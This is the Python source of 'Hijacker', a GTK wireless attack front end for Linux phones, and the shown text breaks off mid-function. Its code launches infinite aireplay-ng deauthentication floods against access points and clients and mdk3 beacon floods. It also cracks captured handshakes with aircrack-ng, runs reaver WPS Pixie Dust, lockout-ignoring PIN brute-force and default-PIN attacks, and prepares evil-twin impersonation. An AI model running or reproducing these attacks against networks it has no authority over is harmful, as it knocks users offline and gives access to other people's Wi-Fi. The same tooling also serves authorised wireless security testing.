#!/usr/bin/env python3
# Author: Shubham Vishwakarma
# git/twitter: ShubhamVis98

import gi, threading, subprocess, shutil, psutil, signal, csv, os, glob, time, json, pyperclip
from datetime import datetime
gi.require_version('Gtk', '3.0')
from gi.repository import Gtk, GdkPixbuf, GLib, Gdk
os.environ["PYPERCLIP_BACKEND"] = "xclip"


class AppDetails:
    name = 'Hijacker'
    version = '1.3'
    desc = "A Clone of Android's Hijacker for Linux Phones"
    dev = 'Shubham Vishwakarma'
    appid = 'in.fossfrog.hijacker'
    applogo = appid
    install_path = f'/usr/lib/{appid}'
    # install_path = '.'
    ui = f'{install_path}/hijacker.ui'
    config_path = f"{os.path.expanduser('~')}/.config/{appid}"
    config_file = f'{config_path}/configuration.json'
    save_dir = f"{os.path.expanduser('~')}/Hijacker"

class Functions:
    def set_app_theme(theme_name, isdark=False):
        settings = Gtk.Settings.get_default()
        settings.set_property("gtk-theme-name", theme_name)
        settings.set_property("gtk-application-prefer-dark-theme", isdark)

    def execute_cmd(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, cwd=None, bufsize=0):
        proc = subprocess.Popen(cmd.split(), stdout=stdout, stderr=stderr, stdin=stdin, cwd=cwd, bufsize=bufsize)
        return proc

    def terminate_processes(proc_name, params):
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            if proc.info['name'] == proc_name and params in str(proc.info['cmdline']):
                try:
                    os.kill(proc.info['pid'], signal.SIGINT)
                    # p = psutil.Process(proc.info['pid'])
                    # p.terminate()
                except psutil.NoSuchProcess as e:
                    print(f"Error terminating process {proc.info['pid']}: {e}")

    def extract_data(csv_file='_tmp-01.csv'):
        while not os.path.exists(csv_file):
            pass
        with open(csv_file, 'r') as f:
            csv_data = f.read()

        aps = []
        clients = []

        reader = csv.reader(csv_data.splitlines())

        for row in reader:
            if len(row) == 15:
                bssid = row[0].strip()
                channel = row[3].strip()
                enc = row[5].strip()
                pwr = row[8].strip()
                essid = row[13].strip()
                vendor = subprocess.Popen(f"macchanger -l | grep -i {bssid[:8]} | cut -d '-' -f3", shell=True, stdout=subprocess.PIPE).communicate()[0].decode().strip()
                if not vendor:
                    vendor = 'Unknown Manufacturer'
                aps.append([bssid, channel, enc, pwr, essid, vendor])
            
            if len(row) == 7:
                st = row[0].strip()
                ap = row[5].strip()
                if ap != '(not associated)':
                    clients.append([st, ap])

        return [aps, clients]

    def remove_files(name='_tmp'):
        for filename in glob.glob(f'{name}*'):
            if os.path.isfile(filename):
                os.remove(filename)
                print(f"Deleted: {filename}")

    def read_config():
        with open(AppDetails.config_file, "r") as f:
            return json.load(f)

    def get_ifaces():
        wifi_interfaces = []
        for interface in psutil.net_if_addrs().keys():
            try:
                output = subprocess.check_output(['iwconfig', interface], stderr=subprocess.STDOUT).decode()
                if 'ESSID' in output or 'Monitor' in output:
                    wifi_interfaces.append(interface)
            except subprocess.CalledProcessError:
                pass

        for interface in psutil.net_if_addrs().keys():
            if 'wlan' in interface and interface not in wifi_interfaces:
                wifi_interfaces.append(interface)

        return wifi_interfaces

    def save_cap(widget=None):
        current_time = datetime.now().strftime('%Y%m%d%H%M%S')
        path_to_save = f'{AppDetails.save_dir}/{current_time}'
        file_list = glob.glob('_tmp*')
        if file_list:
            os.makedirs(path_to_save, exist_ok=True)
            for f in file_list:
                shutil.move(f, path_to_save)
            print(f'Captured files saved: {path_to_save}')

class AboutScreen(Gtk.Window):
    def __init__(self):
        super().__init__()
        builder = Gtk.Builder()
        builder.add_from_file(AppDetails.ui)

        # Get IDs from UI file
        self.about_win = builder.get_object('about_window')
        app_logo = builder.get_object('app_logo')
        app_name_ver = builder.get_object('app_name_ver')
        app_desc = builder.get_object('app_desc')
        app_dev = builder.get_object('app_dev')
        btn_about_close = builder.get_object('btn_about_close')

        # Set logo
        icon_theme = Gtk.IconTheme.get_default()
        pixbuf = icon_theme.load_icon(AppDetails.applogo, 150, 0)
        app_logo.set_from_pixbuf(pixbuf)

        # Set app details
        app_name_ver.set_markup(f'<b>{AppDetails.name} {AppDetails.version}</b>')
        app_desc.set_markup(f'{AppDetails.desc}')
        app_dev.set_markup(
            f'Copyright © 2024 {AppDetails.dev}\n'
            f'<small>extra tools — unofficial port by d4rks1d3</small>'
        )

        btn_about_close.connect('clicked', self.on_close_clicked)

        self.about_win.set_title('About')
        self.add(self.about_win)
        self.about_win.show()

    def on_close_clicked(self, widget):
        self.destroy()

class Aircrack(Functions):
    def __init__(self, builder):
        self.handshake_filechooser = builder.get_object('handshake_filechooser')
        self.wordlist_filechooser = builder.get_object('wordlist_filechooser')
        self.aircrack_btn = builder.get_object('aircrack_btn')
        self.aircrack_btn.connect('clicked', self.aircrack_crack)

    def check_process(self):
        retcode = self.process.poll()
        if retcode is not None:
            self.aircrack_btn.set_label("Start Cracking")
            return False
        return True

    def aircrack_crack(self, widget):
        cap_file = self.handshake_filechooser.get_filename()
        wordlist = self.wordlist_filechooser.get_filename()
        sudocmd = f"sudo -u {os.environ['SUDO_USER']}" if 'SUDO_USER' in os.environ else ''
        command = r"{} aircrack-ng -w {} {}; echo -en '\n\nEnter to exit: '; read".format(sudocmd, wordlist, cap_file)
        with open('/tmp/acrack', 'w') as cmd:
            cmd.write(command)
        
        if self.aircrack_btn.get_label() == 'Start Cracking':
            self.process = Functions.execute_cmd('x-terminal-emulator -e bash /tmp/acrack')
            self.aircrack_btn.set_label('Stop Cracking')
            GLib.timeout_add(100, self.check_process)
        else:
            Functions.terminate_processes('aircrack-ng', '-w')
            self.aircrack_btn.set_label('Start Cracking')

    def run(self):
        pass

class MDK3():
    def __init__(self, builder):
        self.mdk3_window = builder.get_object('mdk3_window')
        beacon_flood_toggle = builder.get_object('beacon_flood_toggle')
        self.check_enc_ap = builder.get_object('check_enc_ap')
        mdk3_ssid_file = builder.get_object('mdk3_ssid_file')
        beacon_flood_toggle.connect("state-set", self.beacon_flood_toggle)
        mdk3_ssid_file.connect("file-set", self.on_ssid_file_set)
        self.ssid_file = None
    
    def run(self):
        pass

    def on_ssid_file_set(self, file_chooser):
        self.ssid_file = file_chooser.get_filename()

    def beacon_flood_toggle(self, switch, state):
        if state:
            iface = Functions.read_config()['interface']
            isenc = f'-w' if self.check_enc_ap.get_active() else ''
            ssid = f'-f {self.ssid_file}' if self.ssid_file else ''
            command = f'mdk3 {iface} b -s 1000 {isenc} {ssid}'
            Functions.execute_cmd(command)  
        else:
            Functions.terminate_processes('mdk3', 'b')

class APRow(Gtk.ListBoxRow):
    # Class-level reference to the running app's Gtk.Builder.  Set once by
    # Airodump.__init__ so that the per-row "Send to <tab>" menu items can
    # reach across tabs to poke wps_bssid_entry / mdk4_target_entry / etc.
    # This is a deliberate module-global instead of a per-instance argument
    # because APRow is instantiated by scan results in a background thread,
    # and threading that builder reference through the call chain adds
    # nothing over just stashing it here at UI construction time.
    builder = None

    # Class-level registry of *the one* deauth flood we allow at a time,
    # keyed by BSSID.  aireplay-ng -0 0 keeps hammering forever; we want
    # every UI toggle to reach that specific subprocess to stop it, and
    # we want a global "Stop All Deauths" button to be able to walk this
    # dict.  {bssid_upper: subprocess.Popen}
    _deauth_procs: dict = {}

    def __init__(self, bssid, ch, sec, pwr, ssid, manufacturer):
        super(APRow, self).__init__()
        self.bssid = bssid
        self.ch = ch
        self.sec = sec
        self.pwr = pwr
        self.ssid = ssid
        self.manufacturer = manufacturer

        # Create a button to hold the row content
        button = Gtk.Button()
        button.connect("clicked", self.ap_clicked)

        # Main container inside the button
        hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10)
        button.add(hbox)

        # Icon
        icon = Gtk.Image.new_from_icon_name("network-wireless", Gtk.IconSize.MENU)
        hbox.pack_start(icon, False, False, 0)

        # Details Box
        details_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=5)
        hbox.pack_start(details_box, True, True, 0)

        # First Line: SSID, BSSID, Manufacturer
        ssid_label = Gtk.Label(label=f"<b>{ssid}</b>", use_markup=True, xalign=0)
        manufacturer_label = Gtk.Label(label=manufacturer, xalign=1)
        first_line = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
        first_line.pack_start(ssid_label, True, True, 0)
        first_line.pack_start(manufacturer_label, False, False, 0)
        details_box.pack_start(first_line, False, False, 0)

        # Second Line: Power, Security, Channel
        bssid_label = Gtk.Label(label=bssid, xalign=0)
        pwr_label = Gtk.Label(label=f"PWR: {pwr}", xalign=0)
        sec_label = Gtk.Label(label=f"SEC: {sec}", xalign=0)
        ch_label = Gtk.Label(label=f"CH: {ch}", xalign=0)
        # other_label = Gtk.Label(label=other, xalign=0)
        second_line = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
        second_line.pack_start(bssid_label, True, True, 0)
        second_line.pack_start(ch_label, True, True, 0)
        second_line.pack_start(pwr_label, True, True, 0)
        second_line.pack_start(sec_label, True, True, 0)
        details_box.pack_start(second_line, False, False, 0)

        # Add the button to the ListBoxRow
        self.add(button)

    def ap_clicked(self, widget):
        # Context menu: Copy MAC + Deauth toggle + one "Send to <tab>"
        # entry per attack module that expects a BSSID.  Each Send-to
        # item populates the target tab's entry fields, then switches
        # the notebook to that tab so the user is one click away from
        # pressing the attack button.
        context_menu = Gtk.Menu()

        copy_mac = Gtk.MenuItem(label="Copy MAC")
        copy_mac.connect("activate", self.copy_mac)
        context_menu.append(copy_mac)

        # Deauth is a toggle now: label switches based on whether a
        # flood is already running against this specific BSSID.  A
        # separate "Stop All Deauths" item is always shown so the user
        # can panic-stop even if the row that started the flood scrolls
        # off screen.
        is_running = self.bssid.upper() in APRow._deauth_procs
        deauth_label = ("Stop Deauth on this AP" if is_running
                        else "Start Deauth on this AP")
        deauth = Gtk.MenuItem(label=deauth_label)
        deauth.connect("activate", self.deauth)
        context_menu.append(deauth)

        if APRow._deauth_procs:
            stop_all = Gtk.MenuItem(
                label=f"Stop All Deauths ({len(APRow._deauth_procs)} running)")
            stop_all.connect("activate", lambda _w: APRow.stop_all_deauths())
            context_menu.append(stop_all)

        context_menu.append(Gtk.SeparatorMenuItem())

        # Only offer the cross-tab items when the builder is wired up
        # (i.e. we are running as part of the full app, not a unit test).
        if APRow.builder is not None:
            # Tab order in hijacker.ui (0-indexed):
            #   0 airodump  1 aircrack  2 mdk3  3 wps  4 hashcat
            #   5 mdk4      6 pmkid     7 eviltwin
            for label, tab_id, populate in (
                ("Send to WPS",       3, self._send_to_wps),
                ("Send to MDK4",      5, self._send_to_mdk4),
                ("Send to PMKID",     6, self._send_to_pmkid),
                ("Send to Evil Twin", 7, self._send_to_eviltwin),
            ):
                item = Gtk.MenuItem(label=label)
                # Capture loop vars via default args (Python closure gotcha).
                # Wrapped in try/except so a bad target-entry lookup does
                # not kill the whole app -- Gtk signal handlers that raise
                # cause SIGABRT on Gtk3, not a nice traceback.
                def _handler(_w, tab=tab_id, fn=populate):
                    try:
                        fn()
                        self._switch_tab(tab)
                    except Exception as exc:
                        import traceback
                        print(f'[send-to] tab {tab} failed: {exc}')
                        traceback.print_exc()
                item.connect("activate", _handler)
                context_menu.append(item)

        context_menu.show_all()
        context_menu.popup(None, None, None, None, 0, Gtk.get_current_event_time())

    def _switch_tab(self, tab_index):
        """Flip the main notebook to the given tab index.

        Indices follow the current .ui ordering (airodump=0, aircrack=1,
        mdk3=2, mdk4=3, wps=? ...).  The order in .ui is:
          0 airodump, 1 aircrack, 2 mdk, 3 wps, 4 hashcat, 5 mdk4,
          6 pmkid, 7 eviltwin.
        If the user reorders tabs in the .ui, update this mapping too.
        """
        nb = APRow.builder.get_object("main_notebook")
        if nb is not None:
            nb.set_current_page(tab_index)

    def _send_to_wps(self):
        b = APRow.builder
        e = b.get_object("wps_bssid_entry")
        c = b.get_object("wps_ch_entry")
        if e: e.set_text(self.bssid)
        if c: c.set_text(str(self.ch))

    def _send_to_mdk4(self):
        e = APRow.builder.get_object("mdk4_target_entry")
        if e: e.set_text(self.bssid)

    def _send_to_pmkid(self):
        e = APRow.builder.get_object("pmkid_bssid_entry")
        if e: e.set_text(self.bssid)

    def _send_to_eviltwin(self):
        # Evil Twin doesn't want a BSSID, it wants an SSID to *impersonate*.
        # Copy the SSID over so the user just presses Start.
        e = APRow.builder.get_object("et_ssid_entry")
        if e and self.ssid:
            e.set_text(self.ssid)

    def copy_mac(self, widget):
        print(f'Copied to clipboard: {self.bssid}')
        pyperclip.copy(self.bssid)

    def deauth(self, widget):
        """Toggle a continuous deauth flood against this AP.

        Previous version fired ``aireplay-ng -0 10`` and returned, so
        there was no way to stop or extend the attack.  Now we keep the
        subprocess alive (``-0 0`` = infinite burst) and register it in
        ``_deauth_procs`` so the same menu item can terminate it on the
        next click, and so ``stop_all_deauths`` can walk every active
        flood in one shot.

        The channel is locked with ``iw`` before the flood starts
        because airodump keeps hopping channels while it scans, and
        aireplay silently drops frames when the radio wanders off.

        Everything is wrapped in a wide try/except so an unexpected
        error (missing tool, config read failure, weird channel value
        pulled from the airodump CSV) shows up as a printed message
        instead of taking the whole GUI down with SIGABRT from an
        unhandled exception inside a Gtk signal handler.
        """
        try:
            self._deauth_impl()
        except Exception as exc:
            import traceback
            print(f'[deauth] EXCEPTION on {self.bssid}: {exc}')
            traceback.print_exc()

    def _deauth_impl(self):
        # Sanitise the fields we lift straight from the airodump CSV.
        # `channel` in particular can be an empty string when airodump
        # has not yet locked onto the AP, or something like " 6 " with
        # whitespace, both of which crash iw.
        bssid = (self.bssid or '').strip()
        if not bssid:
            print('[deauth] no BSSID; ignoring click')
            return
        try:
            channel = int(str(self.ch).strip())
        except (ValueError, TypeError):
            print(f'[deauth] non-numeric channel {self.ch!r}; skipping '
                  'channel-lock (aireplay may still work if airodump has '
                  'converged on the AP).')
            channel = None

        key = bssid.upper()
        proc = APRow._deauth_procs.get(key)
        if proc is not None:
            # Toggle-off: kill the running flood.
            print(f'[deauth] stop {bssid}')
            try:
                proc.terminate()
                try:
                    proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    proc.kill()
            except Exception as exc:
                print(f'[deauth] terminate failed for {bssid}: {exc}')
            APRow._deauth_procs.pop(key, None)
            return

        # Toggle-on: lock the channel, then spawn an infinite flood.
        try:
            iface = Functions.read_config()['interface']
        except Exception as exc:
            print(f'[deauth] cannot read interface from config: {exc}')
            return
        if not iface:
            print('[deauth] no interface configured (Config -> Interface)')
            return

        print(f'[deauth] start on {bssid} ch {channel} via {iface}')

        # Resolve tools via shutil.which so a missing binary is a clean
        # error instead of Popen raising FileNotFoundError up into the
        # Gtk signal handler.
        aireplay = shutil.which('aireplay-ng')
        if not aireplay:
            print('[deauth] aireplay-ng not found in PATH')
            return
        iw_bin = shutil.which('iw')

        if channel is not None and iw_bin:
            # Prefer `iw dev <if> set channel N` -- it works on every
            # cfg80211 driver, unlike the old iwconfig channel path
            # which is silently a no-op on some kernels.
            r = subprocess.run(
                [iw_bin, 'dev', iface, 'set', 'channel', str(channel)],
                stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
                text=True)
            if r.returncode != 0:
                print(f'[deauth] channel lock ({channel}) failed: '
                      f'{r.stderr.strip()}; continuing anyway')

        try:
            proc = subprocess.Popen(
                [aireplay, '-0', '0', '-a', bssid, iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except OSError as exc:
            print(f'[deauth] cannot spawn aireplay-ng: {exc}')
            return
        APRow._deauth_procs[key] = proc

    @classmethod
    def stop_all_deauths(cls):
        """Kill every deauth flood we've ever spawned.

        Called by the "Stop All Deauths" context-menu item and could be
        wired to a keyboard shortcut later.  Idempotent: if a proc is
        already dead we just drop the entry.
        """
        for key, proc in list(cls._deauth_procs.items()):
            print(f'[deauth] stop-all: killing {key}')
            try:
                proc.terminate()
                try:
                    proc.wait(timeout=1)
                except subprocess.TimeoutExpired:
                    proc.kill()
            except Exception as exc:
                print(f'[deauth] stop-all failed for {key}: {exc}')
            cls._deauth_procs.pop(key, None)

    def watch(self, widget):
        pass

class STRow(Gtk.ListBoxRow):
    def __init__(self, st, ap):
        super(STRow, self).__init__()
        self.ap = ap
        self.st = st

        button = Gtk.Button()
        button.connect("clicked", self.st_clicked)

        box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
        st_label = Gtk.Label(label=f"<b>{ap}</b>", use_markup=True)
        ap_label = Gtk.Label(label=f"<b>{st}</b>", use_markup=True)
        arrow = Gtk.Label(label="~~~>", use_markup=True)
        box.pack_start(st_label, True, True, 0)
        box.pack_start(arrow, True, True, 0)
        box.pack_start(ap_label, True, True, 0)

        button.add(box)

        self.add(button)

    def st_clicked(self, widget):
        # Create context menu and items
        context_menu = Gtk.Menu()
        copy_mac = Gtk.MenuItem(label="Copy MAC")
        deauth = Gtk.MenuItem(label="Deauth")

        # Connect the menu items to callback functions
        copy_mac.connect("activate", self.copy_mac)
        deauth.connect("activate", self.deauth)

        # Add menu items to the context menu
        context_menu.append(copy_mac)
        context_menu.append(deauth)

        # Show all menu items
        context_menu.show_all()
        context_menu.popup(None, None, None, None, 0, Gtk.get_current_event_time())

    def copy_mac(self, widget):
        pyperclip.copy(self.st)
        print(f'Copied to clipboard: {self.st}')

    def deauth(self, widget):
        iface = Functions.read_config()['interface']
        aps, clients = Functions.extract_data()
        for ap in aps:
            if self.ap in ap:
                ch = ap[1]
        print(f'Deauthenticating {self.st} connected with {self.ap} on channel {ch}')
        Functions.execute_cmd(f'iwconfig {iface} channel {ch}')
        Functions.execute_cmd(f'aireplay-ng -0 10 -a {self.ap} -c {self.st} {iface}')


class Airodump(Functions):
    def __init__(self, builder):
        Functions.set_app_theme("Adwaita", True)
        self.builder = builder
        # Publish the builder so APRow can reach across tabs to poke the
        # target-entry fields of WPS / MDK4 / PMKID / Evil Twin from its
        # "Send to <tab>" context menu.  Kept as a class attribute
        # because scan results create APRow instances from a background
        # thread and we do not want to plumb the builder through
        # csv-parsing helpers.
        APRow.builder = builder
        self.builder.get_object('btn_quit').connect('clicked', self.quit)
        self.btn_toggle = builder.get_object('btn_toggle')
        self.btn_toggle_img = builder.get_object('btn_toggle_img')
        self.btn_menu = builder.get_object('btn_menu')
        self.ap_list = builder.get_object("airodump_list")
        self.btn_save_cap = builder.get_object("btn_save_cap")

        self.btn_toggle.connect('clicked', self.scan_toggle)
        self.ap_list.set_homogeneous(False)
        self.listbox = Gtk.ListBox()

        self.btn_save_cap.connect('clicked', Functions.save_cap)

        self.builder.get_object('btn_config').connect('clicked', Config_Window)
        self.builder.get_object('btn_about').connect('clicked', self.show_about)

    def run(self):
        self.check_config()

    def quit(self, widget):
        self._stop_signal = 1
        Gtk.main_quit()

    def show_about(self, widget=None):
        AboutScreen()

    def check_config(self):
        default_config_data = {
            'interface': 'wlan0',
            'check_aps': 'true',
            'check_stations': 'true',
            'channels_entry': '',
            'channels_all': 'true'
        }
        if not os.path.exists(AppDetails.config_file):
            print('No config file found. Creating default config file.')
            os.makedirs(AppDetails.config_path, exist_ok=True)
            with open(AppDetails.config_file, 'w') as config_file:
                json.dump(default_config_data, config_file, indent=4)

    def on_active_response(self, dialog, response_id):
        dialog.hide()

    def scan_toggle(self, widget):
        current = self.btn_toggle_img.get_property('icon-name')

        # Load config
        load_config = Functions.read_config()
        show_aps = load_config['check_aps']
        show_stations = load_config['check_stations']
        channels_all = load_config['channels_all']
        channels_entry = f"-c {load_config['channels_entry']}" if load_config['channels_entry'] != '' else ''
        iface = load_config['interface']

        if channels_all:
            channels_entry = ''

        if iface not in Functions.get_ifaces():
            print(f'{iface} not available. Please change the interface from configuration.')
            return
        scan_command = f"airodump-ng -w _tmp --write-interval 1 --output-format csv,pcap --background 1 {channels_entry} {iface}"

        if 'start' in current:
            Functions.remove_files()
            self.proc = Functions.execute_cmd(scan_command)
            self.proc = Functions.execute_cmd('ls')
            self.btn_toggle_img.set_property('icon-name', 'media-playback-stop')
            self._stop_signal = 0
            threading.Thread(target=self.watchman).start()

            for child in self.listbox.get_children():
                self.listbox.remove(child)
            self.listbox.set_selection_mode(Gtk.SelectionMode.NONE)
            self.ap_list.pack_start(self.listbox, False, False, 0)
            self._tmp_aplist = self._tmp_stlist = []
        else:
            self._stop_signal = 1
            Functions.terminate_processes('airodump-ng', 'background')
            self.btn_toggle_img.set_property('icon-name', 'media-playback-start')

    def add_btn(self):
        button = Gtk.Button(label=f"Button")
        button.set_size_request(-1, 50)
        self.ap_list.pack_start(button, True, True, 0)
        self.ap_list.show_all()

    def watchman(self):
        while True:
            if self._stop_signal:
                break
            time.sleep(1)

            aps, stations = Functions.extract_data()
            print(f'APS: {aps}\nClients: {stations}')

            for _ap in aps[1:]:
                if _ap[0] not in self._tmp_aplist and Functions.read_config()['check_aps']:
                    row = APRow(*_ap)
                    self.listbox.add(row)
                    self._tmp_aplist.append(_ap[0])
                    self.ap_list.show_all()

            for _st in stations[1:]:
                if _st[0] not in self._tmp_stlist and Functions.read_config()['check_stations']:
                    row = STRow(*_st)
                    self.listbox.add(row)
                    self._tmp_stlist.append(_st[0])
                    self.ap_list.show_all()


class Config_Window(Functions):
    def __init__(self, widget):
        builder = Gtk.Builder()
        builder.add_from_file(AppDetails.ui)
        self.config_win = builder.get_object('config_window')
        self.config_win.set_title('Configuration')

        # Interfaces
        self.interface = builder.get_object('interfaces_list')
        self.ifaces = Functions.get_ifaces()
        for i in self.ifaces:
            self.interface.append_text(i)

        # Filters
        self.check_aps = builder.get_object('check_aps')
        self.check_stations = builder.get_object('check_stations')

        # Channels
        self.channels_entry = builder.get_object('channels_entry')
        self.channels_all = builder.get_object('channels_all')

        # Buttons
        self.btn_config_save = builder.get_object('btn_config_save')
        self.btn_config_cancel = builder.get_object('btn_config_cancel')
        self.btn_config_quit = builder.get_object('btn_config_quit')

        self.btn_config_save.connect('clicked', self.save_config)
        self.btn_config_cancel.connect('clicked', self.quit)
        self.btn_config_quit.connect('clicked', self.quit)

        self.load_config()

        self.config_win.show()

    def load_config(self):
        # Check if the config file exists
        if os.path.exists(AppDetails.config_file):
            with open(AppDetails.config_file, 'r') as config_file:
                config_data = json.load(config_file)
                try:
                    self.interface.set_active(self.ifaces.index(config_data['interface']))
                except ValueError:
                    print(f"Interface {config_data['interface']} is not available.")
                self.check_aps.set_active(config_data.get('check_aps', False))
                self.check_stations.set_active(config_data.get('check_stations', False))
                self.channels_entry.set_text(config_data.get('channels_entry', ''))
                self.channels_all.set_active(config_data.get('channels_all', False))

            print(f'Configuration loaded from {AppDetails.config_file}.')
        else:
            print('No configuration file found.')

    def save_config(self, widget):
        # Collect data from the UI elements
        config_data = {
            'interface': self.interface.get_active_text(),
            'check_aps': self.check_aps.get_active(),
            'check_stations': self.check_stations.get_active(),
            'channels_entry': self.channels_entry.get_text(),
            'channels_all': self.channels_all.get_active()
        }

        # Save the data to a JSON file
        with open(AppDetails.config_file, 'w') as config_file:
            json.dump(config_data, config_file, indent=4)

        print(f'Configuration saved to {AppDetails.config_file}.')      
        self.config_win.destroy()

    def quit(self, widget):
        self.config_win.destroy()

class WPS(Functions):
    """
    WPS attacks tab: scan with wash, attack with reaver (Pixie Dust + PIN brute).
    All three tools (wash, reaver, bully) are present on this device.
    """
    def __init__(self, builder):
        self.scan_btn    = builder.get_object('wps_scan_btn')
        self.ap_list     = builder.get_object('wps_ap_list')
        self.bssid_entry = builder.get_object('wps_bssid_entry')
        self.ch_entry    = builder.get_object('wps_ch_entry')
        self.pixie_btn   = builder.get_object('wps_pixie_btn')
        self.pin_btn     = builder.get_object('wps_pin_btn')
        self.null_btn    = builder.get_object('wps_null_btn')
        self.output_tv   = builder.get_object('wps_output')

        self._scanning  = False
        self._attacking = False
        self._wash_proc  = None
        self._reaver_proc = None
        self._aps = []  # (bssid, ch, locked, ssid)

        self.scan_btn.connect('clicked', self._toggle_scan)
        self.pixie_btn.connect('clicked', self._run_pixie)
        self.pin_btn.connect('clicked', self._run_pin)
        self.null_btn.connect('clicked', self._run_null)

    def run(self):
        pass

    # ── helpers ─────────────────────────────────────────────────────────────

    def _log(self, text):
        def _do():
            buf = self.output_tv.get_buffer()
            buf.insert(buf.get_end_iter(), text + '\n')
            return False
        GLib.idle_add(_do)

    def _iface(self):
        return Functions.read_config().get('interface', '')

    def _target(self):
        bssid = self.bssid_entry.get_text().strip()
        ch    = self.ch_entry.get_text().strip() or '1'
        iface = self._iface()
        if not bssid:
            self._log('[!] Enter a BSSID first (scan or type it manually).')
            return None, None, None
        return iface, bssid, ch

    # ── scan ────────────────────────────────────────────────────────────────

    def _toggle_scan(self, widget):
        if not self._scanning:
            self._start_scan()
        else:
            self._stop_scan()

    def _start_scan(self):
        iface = self._iface()
        if not iface:
            self._log('[!] No interface configured.')
            return
        self._scanning = True
        self._aps = []
        for row in self.ap_list.get_children():
            self.ap_list.remove(row)
        self.scan_btn.set_label('Stop Scan')
        self._log(f'[*] Scanning WPS APs on {iface} (must be in monitor mode)...')
        tool = 'wash' if shutil.which('wash') else None
        if not tool:
            self._log('[!] wash not found; install reaver/wash.')
            self._scanning = False
            self.scan_btn.set_label('Scan WPS APs')
            return
        self._wash_proc = subprocess.Popen(
            ['wash', '-i', iface, '--ignore-fcs'],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            universal_newlines=True, bufsize=1)
        threading.Thread(target=self._read_wash, daemon=True).start()

    def _stop_scan(self):
        self._scanning = False
        self.scan_btn.set_label('Scan WPS APs')
        if self._wash_proc:
            try: self._wash_proc.terminate()
            except Exception: pass
            self._wash_proc = None
        self._log('[*] Scan stopped.')

    def _read_wash(self):
        for line in self._wash_proc.stdout:
            line = line.strip()
            if not line or line.startswith('BSSID') or line.startswith('-') or line.startswith('['):
                continue
            parts = line.split()
            if len(parts) >= 4 and ':' in parts[0]:
                bssid  = parts[0]
                ch     = parts[1]
                locked = parts[4] if len(parts) > 4 else '?'
                ssid   = ' '.join(parts[6:]) if len(parts) > 6 else '<hidden>'
                if bssid not in [a[0] for a in self._aps]:
                    self._aps.append((bssid, ch, locked, ssid))
                    self._log(f'[+] {bssid}  CH:{ch}  Locked:{locked}  SSID:{ssid}')
                    GLib.idle_add(self._add_row, bssid, ch, locked, ssid)
        self._scanning = False
        GLib.idle_add(self.scan_btn.set_label, 'Scan WPS APs')

    def _add_row(self, bssid, ch, locked, ssid):
        row = Gtk.ListBoxRow()
        lbl = Gtk.Label(label=f'{bssid}  CH:{ch}  Lck:{locked}  {ssid}', xalign=0)
        lbl.set_margin_start(6); lbl.set_margin_end(6)
        row.set_child(lbl)
        row._bssid = bssid; row._ch = ch
        self.ap_list.append(row)
        row.connect('activate', lambda r: (
            self.bssid_entry.set_text(r._bssid),
            self.ch_entry.set_text(r._ch)))
        self.ap_list.connect('row-activated', lambda lb, r: (
            self.bssid_entry.set_text(r._bssid),
            self.ch_entry.set_text(r._ch)))
        return False

    # ── attacks ─────────────────────────────────────────────────────────────

    def _stop_attack(self):
        if self._reaver_proc:
            try: self._reaver_proc.terminate()
            except Exception: pass
            self._reaver_proc = None
        self._attacking = False

    def _run_pixie(self, widget):
        if self._attacking:
            self._stop_attack()
            self.pixie_btn.set_label('Pixie Dust')
            return
        iface, bssid, ch = self._target()
        if not iface: return
        self._attacking = True
        self.pixie_btn.set_label('Stop')
        # -K 1 = Pixie Dust in reaver ≥ 1.6.5; -N = no assoc (monitor mode)
        cmd = ['reaver', '-i', iface, '-b', bssid, '-c', ch, '-K', '1', '-vv', '-N']
        self._log(f'[*] Pixie Dust: {" ".join(cmd)}')
        self._launch_reaver(cmd, self.pixie_btn, 'Pixie Dust')

    def _run_pin(self, widget):
        if self._attacking:
            self._stop_attack()
            self.pin_btn.set_label('PIN Brute')
            return
        iface, bssid, ch = self._target()
        if not iface: return
        self._attacking = True
        self.pin_btn.set_label('Stop')
        # -L ignore lockout, -d 1 delay, -N no assoc
        cmd = ['reaver', '-i', iface, '-b', bssid, '-c', ch, '-vv', '-N', '-L', '-d', '1']
        self._log(f'[*] PIN Brute: {" ".join(cmd)}')
        self._launch_reaver(cmd, self.pin_btn, 'PIN Brute')

    def _run_null(self, widget):
        iface, bssid, ch = self._target()
        if not iface: return
        if self._attacking:
            self._stop_attack()
            self.null_btn.set_label('NULL PIN')
            return
        self._attacking = True
        self.null_btn.set_label('Stop')
        # Try common default/null PINs; most likely to work on ISP routers
        cmd = ['reaver', '-i', iface, '-b', bssid, '-c', ch, '-p', '12345670', '-vv', '-N']
        self._log(f'[*] NULL/default PIN: {" ".join(cmd)}')
        self._launch_reaver(cmd, self.null_btn, 'NULL PIN')

    def _launch_reaver(self, cmd, btn, label):
        self._reaver_proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            universal_newlines=True, bufsize=1)
        threading.Thread(
            target=self._read_reaver, args=(btn, label), daemon=True).start()

    def _read_reaver(self, btn, label):
        for line in self._reaver_proc.stdout:
            line = line.strip()
            if line:
                self._log(line)
            if 'WPS PIN:' in line or 'WPA PSK:' in line:
                self._log(f'\n[!!!] SUCCESS: {line}')
        self._attacking = False
        if btn:
            GLib.idle_add(btn.set_label, label)


class MonitorMode(Functions):
    """Header-bar toggle: put the selected interface in/out of monitor mode."""
    def __init__(self, builder):
        self.mon_btn = builder.get_object('btn_monitor')

    def run(self):
        if self.mon_btn:
            self.mon_btn.connect('clicked', self._toggle)

    def _toggle(self, widget):
        iface = Functions.read_config().get('interface', '')
        if not iface:
            return
        # Detect current mode
        try:
            out = subprocess.check_output(['iwconfig', iface],
                                          stderr=subprocess.STDOUT).decode()
            in_monitor = 'Monitor' in out
        except Exception:
            in_monitor = False

        if in_monitor:
            # Stop monitor mode
            Functions.terminate_processes('airodump', '')
            Functions.execute_cmd(f'airmon-ng stop {iface}mon')
